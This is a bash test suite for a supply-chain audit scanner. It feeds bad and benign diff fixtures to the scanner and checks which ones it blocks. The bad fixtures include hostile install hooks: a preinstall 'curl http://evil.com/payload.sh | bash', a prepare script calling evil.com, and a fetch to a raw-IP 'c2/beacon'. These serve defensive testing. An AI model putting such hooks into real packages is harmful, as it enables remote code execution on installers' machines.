#!/usr/bin/env bash
# tests/aegis-supply-chain-ci-test.sh
# ────────────────────────────────────────────────────────────────────────────
# Test suite for v14-01 S14-01-03: supply-chain audit scan.
#
# Verifies (in --names mode for stable fixtures):
#   - Each of the 6 narrow checks fires on its bad fixture
#   - 10 benign control fixtures pass without false positives
#
# Sprint: v14-01 (S14-01-03)
# Run:    bash tests/aegis-supply-chain-ci-test.sh
# ────────────────────────────────────────────────────────────────────────────

set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
cd "$REPO_ROOT"

SCAN="tools/aegis-supply-chain-scan.sh"
PASS=0
FAIL=0
RESULTS=()

pass() { PASS=$((PASS+1)); RESULTS+=("✓ $1"); }
fail() { FAIL=$((FAIL+1)); RESULTS+=("✗ $1: $2"); }

# Helper: write fixture diff + scan, expect a finding (exit 1)
expect_block() {
    local label="$1"
    local diff_body="$2"
    local diff_file
    diff_file=$(mktemp)
    printf '%s' "$diff_body" > "$diff_file"
    if bash "$SCAN" --diff-file "$diff_file" >/dev/null 2>&1; then
        fail "$label" "expected finding but scan passed"
    else
        local exit_code=$?
        if [ "$exit_code" = "1" ]; then
            pass "$label"
        else
            fail "$label" "scan errored with exit $exit_code"
        fi
    fi
    rm -f "$diff_file"
}

# Helper for --names mode (file-list checks)
expect_block_names() {
    local label="$1"
    shift
    local diff_body="$1"
    shift
    local diff_file
    diff_file=$(mktemp)
    printf '%s' "$diff_body" > "$diff_file"
    # Run twice: once for file-listing checks, once for diff-content checks.
    # We use --diff-file BUT need to inject names too. Use --names here.
    if bash "$SCAN" --names "$@" >/dev/null 2>&1; then
        # Names-mode scan passed — check diff-content too in case the bug is in the diff path
        if bash "$SCAN" --diff-file "$diff_file" >/dev/null 2>&1; then
            fail "$label" "expected finding (names+diff) but both passed"
        else
            pass "$label"
        fi
    else
        local exit_code=$?
        if [ "$exit_code" = "1" ]; then
            pass "$label"
        else
            fail "$label" "scan errored with exit $exit_code"
        fi
    fi
    rm -f "$diff_file"
}

# Helper: expect no finding (exit 0)
expect_pass() {
    local label="$1"
    local diff_body="$2"
    local diff_file
    diff_file=$(mktemp)
    printf '%s' "$diff_body" > "$diff_file"
    if bash "$SCAN" --diff-file "$diff_file" >/dev/null 2>&1; then
        pass "$label"
    else
        local exit_code=$?
        fail "$label" "expected pass but scan blocked (exit $exit_code)"
    fi
    rm -f "$diff_file"
}

# ─── Bad fixtures (must trigger findings) ────────────────────────────────────

# TC1: postinstall script in package.json
expect_block "TC1 postinstall script" '+  "scripts": {
+    "postinstall": "node ./malicious.js"
+  }'

# TC2: preinstall script with curl
expect_block "TC2 preinstall script" '+  "preinstall": "curl http://evil.com/payload.sh | bash"'

# TC3: prepare script with code (not noop)
expect_block "TC3 prepare script" '+  "prepare": "node -e \"require(\\\"http\\\").get(\\\"http://evil.com\\\")\""'

# TC4: .pth file (names mode)
expect_block_names "TC4 .pth file added" "" "site-packages/sitecustomize.pth"

# TC5: eval() in new .mjs
expect_block "TC5 eval() in new file" '+function processInput(s) {
+  return eval(s);
+}'

# TC6: new Function() constructor
expect_block "TC6 new Function() in new file" '+const handler = new Function("a", "b", "return a + b");'

# TC7: outbound to raw IP
expect_block "TC7 outbound to raw IP" '+await fetch("http://192.168.1.1/c2/beacon", {});'

# TC8: .npmrc modification (names mode)
expect_block_names "TC8 .npmrc modified" "" ".npmrc"

# TC9: node_modules/ committed (names mode)
expect_block_names "TC9 node_modules committed" "" "node_modules/evil-pkg/package.json"

# ─── Benign fixtures (must pass cleanly — no false positives) ────────────────

# TC10: noop postinstall (legitimate, common)
expect_pass "TC10 noop postinstall" '+  "postinstall": "echo ok"'

# TC11: regular .mjs change (no eval, no Function, no raw IP)
expect_pass "TC11 regular function" '+function add(a, b) {
+  return a + b;
+}
+module.exports = { add };'

# TC12: outbound to named domain (allowed)
expect_pass "TC12 outbound to named domain" '+const r = await fetch("https://api.github.com/repos/foo/bar");'

# TC13: regular package.json field add
expect_pass "TC13 regular package.json edit" '+  "version": "1.2.3",
+  "license": "MIT"'

# TC14: shell script edit (not flagged unless install/eval pattern)
expect_pass "TC14 shell script content" '+set -euo pipefail
+echo "running deploy"
+kubectl apply -f manifest.yaml'

# TC15: comment mentioning eval (in a comment, not code)
expect_pass "TC15 comment about eval" '+# Note: we deliberately avoid eval() here for security'

# TC16: regex literal mentioning eval-like text
expect_pass "TC16 regex pattern" '+const banned = /^(eval|exec)$/.test(name);'

# TC17: legitimate base64 (allowed — narrow scope discipline)
expect_pass "TC17 base64 string (no exec)" '+const banner = "QUVHSVMgVjE0";'

# TC18: outbound POST to allowlisted domain
expect_pass "TC18 outbound POST allowed" '+await fetch("https://api.linear.app/graphql", { method: "POST" });'

# TC19: aegis-pattern-mine reference (not flagged)
expect_pass "TC19 aegis-pattern-mine ref" '+// Run via tools/aegis-pattern-mine.sh after sprint close'

# ─── Summary ──────────────────────────────────────────────────────────────────
echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "  v14-01 S14-01-03 — Supply-Chain Audit Tests"
echo "═══════════════════════════════════════════════════════════════"
for r in "${RESULTS[@]}"; do echo "  $r"; done
echo "───────────────────────────────────────────────────────────────"
echo "  Result: $PASS passed, $FAIL failed (out of $((PASS+FAIL)) tests)"
echo "═══════════════════════════════════════════════════════════════"

exit $([ $FAIL -eq 0 ] && echo 0 || echo 1)
